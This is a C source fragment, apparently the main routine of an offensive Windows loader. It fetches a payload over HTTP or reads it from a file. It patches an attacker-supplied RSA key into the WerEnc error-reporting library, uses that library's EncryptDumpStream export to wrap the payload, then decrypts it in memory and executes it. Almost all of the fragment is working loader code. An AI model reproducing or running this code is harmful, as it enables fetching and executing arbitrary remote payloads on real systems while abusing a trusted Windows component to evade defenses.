        SecureZeroMemory(privBlob, privLen);
        free(pubBlob); free(privBlob);
        return ret;
    }

// single mode. 
    
    DWORD privLen = 0;
    BYTE *privBlob = ReadKeyFile(L"werenc_priv.key", &privLen);
    if (!privBlob || privLen < sizeof(RSAKEY_BLOB)) {
        printf("[!] werenc_priv.key required\n");
        return 1;
    }

    
    DWORD inputLen = 0;
    BYTE *input = NULL;
    if (urlMode) {
        printf("[*] fetching...\n");
        input = FetchHTTP(target, &inputLen);
    } else {
        input = ReadFileToMem(target, &inputLen);
    }
    if (!input || inputLen == 0) {
        printf("[!] failed to read input\n"); return 1;
    }
    printf("[+] input: %lu bytes\n", (unsigned long)inputLen);

   
    DWORD encLen = 0;
    BYTE *encBuf = NULL;

    if (IsWerEncContainer(input, inputLen) && !memStage) {
        printf("[+] WerEnc v2 container detected, decrypting...\n");
        encBuf = input;
        encLen = inputLen;
        input = NULL;
    } else {
        printf("[*] raw payload, encrypting in memory via WerEnc!EncryptDumpStream...\n");

        if (!InitOle()) { printf("[!] OLE init failed\n"); return 1; }

        fn_EncStream pEncStream = (fn_EncStream)GetProcAddress(hEnc, "EncryptDumpStream");
        if (!pEncStream) pEncStream = (fn_EncStream)GetProcAddress(hEnc, (LPCSTR)2);
        if (!pEncStream) { printf("[!] EncryptDumpStream not found\n"); return 1; }

        DWORD pubLen = 0;
        BYTE *pubBlob = ReadKeyFile(L"werenc_pub.key", &pubLen);
        if (!pubBlob || pubLen < sizeof(RSAKEY_BLOB)) {
            printf("[!] werenc_pub.key required for --mem-stage\n"); return 1;
        }
        if (Patching_key(hEnc, pubBlob, pubLen) == 0) {
            printf("[!] BYOK patch failed\n"); return 1;
        }
        free(pubBlob);
        printf("[+] BYOK patched\n");

        encBuf = EncryptInMemory(pEncStream, input, inputLen, &encLen);

        SecureZeroMemory(input, inputLen);
        VirtualFree(input, 0, MEM_RELEASE);
        input = NULL;

        if (!encBuf || encLen == 0) {
            printf("[!] EncryptDumpStream failed\n"); return 1;
        }
        printf("[+] encrypted: %lu bytes (WerEnc v2 container)\n",
               (unsigned long)encLen);
    }

    // decryption phase.....
    DWORD plainLen = 0;
    BYTE *plain = DecryptContainer(encBuf, encLen, privBlob, privLen, &plainLen);

    SecureZeroMemory(encBuf, encLen);
    VirtualFree(encBuf, 0, MEM_RELEASE);
    SecureZeroMemory(privBlob, privLen);
    free(privBlob);

    if (!plain || plainLen == 0) {
        printf("[!] decryption failed\n"); return 1;
    }
    printf("[+] decrypted: %lu bytes\n", (unsigned long)plainLen);

    if (testMode) {
        printf("  "); hexdump(plain, plainLen, 64);
        printf("  ASCII: ");
        DWORD show = (plainLen < 80) ? plainLen : 80;
        for (DWORD i = 0; i < show; i++) {
            BYTE b = plain[i]; printf("%c", (b >= 0x20 && b < 0x7F) ? b : '.');
        }
        printf("\n");
        VirtualFree(plain, 0, MEM_RELEASE);
        return 0;
    }

    printf("[*] executing...\n");
    Execute(plain, plainLen);
    VirtualFree(plain, 0, MEM_RELEASE);
    return 0;
}
